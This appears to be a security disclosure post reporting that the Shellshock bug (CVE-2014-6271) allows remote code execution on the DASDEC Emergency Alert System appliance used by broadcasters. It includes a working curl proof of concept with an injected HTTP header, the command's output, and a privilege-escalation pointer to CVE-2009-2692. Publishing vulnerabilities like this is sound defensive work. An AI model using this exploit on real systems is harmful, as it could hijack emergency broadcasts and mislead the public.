I'm able to get remote code execution via CVE-2014-6271 on the Digital 
Alert Systems DASDEC. This appliance is used by broadcasters to send and
receive Emergency Alert System messages over IP and AFSK. Once 
authenticated, 
an attacker can interrupt broadcasts (via a relay) and play arbitrary audio 
over the airwaves.

Exploiting it only requires a malicious HTTP header:

curl -H 'X-Shell-Shock: () { :; }; /bin/echo vulnerable  > 
/tmp/dumped_file'
http://192.168.0.45/dasdec/dasdec.csp

[matt@...T-EAS ~]# cat /tmp/dumped_file 
vulnerable

Commands are executed as the apache user, but privilege escalation can 
still
be obtained through CVE-2009-2692 despite the vendor's recent cumulative 
security patch.

I suspect all versions of the DASDEC are vulnerable to this, although I 
only have a DASDEC-1EN running software version 2.0-2 to test.
